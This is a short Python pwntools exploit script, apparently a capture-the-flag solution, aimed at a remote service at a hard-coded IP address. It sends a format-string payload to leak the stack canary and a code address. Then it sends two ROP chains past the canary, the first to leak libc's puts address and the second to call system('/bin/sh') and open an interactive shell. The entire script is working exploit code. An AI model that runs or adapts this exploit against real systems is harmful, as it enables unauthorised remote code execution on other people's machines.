from pwn import *

e = ELF("./pwn_secret")
libc = ELF("./libc6_2.23-0ubuntu10_amd64.so")
#p = e.process()
p = remote("34.141.123.136", 31869)

context.binary = e

# leak canary
p.recvline()
p.recvuntil(b"Name: ")
p.sendline(b"%15$p.%16$p")  # format string payload

output = p.recvline().decode()

canary = output.split(".")[0][+8:]
log.success("Canary found: %s" % canary)  # canary leak
canary = int(canary, 16)

main_leak = int(output.split(".")[1][:-1], 16)
log.success("Main leak found: %s" % hex(main_leak))  # __libc_csu_init leak

# Here we set the program's base address in memory
e.address = main_leak - 3136  # 3136 is the offset of __libc_csu_init

p.recvuntil(b"Phrase: ")

# First ROP chain to leak puts GOT entry
rop = ROP(e)
rop.call(e.plt["puts"], [e.got['puts']])
rop.call(e.sym["main"])

offset = 144

payload = b"A" * 136 + p64(canary) + b"B" * 8 + \
    rop.chain()  # the canary is at offset 136
p.sendline(payload)
p.recvuntil(b"same!")
p.recvline()

puts_leak = u64(p.recvline().strip(b"\n").ljust(8, b"\x00"))

log.success("Puts found: %s" % hex(puts_leak))

# Here we set libc's base address in memory
libc.address = puts_leak - libc.sym['puts']

# return gadget for aligning the stack
ret = e.address + 0x889

# Second ROP chain to call system("/bin/sh")
rop2 = ROP(e)
rop2.call(ret)
rop2.call(libc.sym['system'], [next(libc.search(b"/bin/sh\x00"))])

payload = b"A" * 136 + p64(canary) + b"B" * 8 + rop2.chain()

p.sendline(b"pwned")
p.sendline(payload)

p.recvuntil(b"same!")

log.success("Shell spawned!")

p.interactive()
